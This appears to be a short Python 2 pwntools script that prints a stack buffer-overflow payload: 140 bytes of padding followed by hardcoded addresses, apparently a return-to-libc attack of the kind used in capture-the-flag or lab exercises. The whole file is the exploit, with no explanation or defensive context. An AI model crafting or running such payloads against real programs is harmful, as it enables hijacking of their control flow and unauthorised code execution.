from pwn import *

print "A"* 140 + p32(0xf7e39da0) + "A"*4 +p32(0xffffd73e)
